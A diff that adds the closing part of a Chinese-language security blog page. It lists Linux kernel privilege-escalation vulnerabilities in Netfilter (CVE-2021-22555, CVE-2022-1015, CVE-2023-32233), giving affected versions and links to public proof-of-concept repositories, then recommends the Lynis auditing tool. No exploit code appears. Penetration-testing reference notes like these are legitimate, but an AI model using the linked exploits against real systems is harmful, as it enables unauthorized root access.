+<p>功能：</p>
+<ol>
+<li>Packet defragmentation</li>
+<li>Connection tracking</li>
+<li>Network address translation (NAT)</li>
+</ol>
+<p>当模块被激活时，所有 IP 数据包会在被转发到本机或远程系统的目标应用程序之前，由 <code>Netfilter</code> 进行检查</p>
+<p>漏洞：（这些漏洞利用可能非常不稳定，可能会破坏系统）</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/google/security-research/tree/master/pocs/linux/cve-2021-22555">CVE-2021-22555</a><ul>
+<li>Vulnerable kernel versions: 2.6 - 5.11</li>
+</ul>
+</li>
+<li><a target="_blank" rel="noopener" href="https://github.com/pqlx/CVE-2022-1015">CVE-2022-1015</a><ul>
+<li>affects Linux kernel 5.4 through 5.6.10</li>
+<li>可能会破坏内核</li>
+</ul>
+</li>
+<li><a target="_blank" rel="noopener" href="https://github.com/Liuk3r/CVE-2023-32233">CVE-2023-32233</a><ul>
+<li>Linux Kernel up to version 6.3.1</li>
+</ul>
+</li>
+</ul>
+<h3 id="lynis"><a href="#lynis" class="headerlink" title="lynis"></a>lynis</h3><p><a target="_blank" rel="noopener" href="https://github.com/CISOfy/lynis">CISOfy&#x2F;lynis: Lynis - Security auditing tool for Linux, macOS, and UNIX-based systems. Assists with compliance testing (HIPAA&#x2F;ISO27001&#x2F;PCI DSS) and system hardening. Agentless, and installation optional.</a></p>
+<p>类 unix 系统审计工具，可用于告知权限提升路径，并进行快速配置检查</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/04/16/Ingress-Nginx%20Nightmare%20%E5%A4%8D%E7%8E%B0/" rel="prev" title="Ingress-Nginx Nightmare 复现~">
+                  <i class="fa fa-angle-left"></i> Ingress-Nginx Nightmare 复现~
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">l1nk</span>
+  </div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/mist/" rel="noopener" target="_blank">NexT.Mist</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
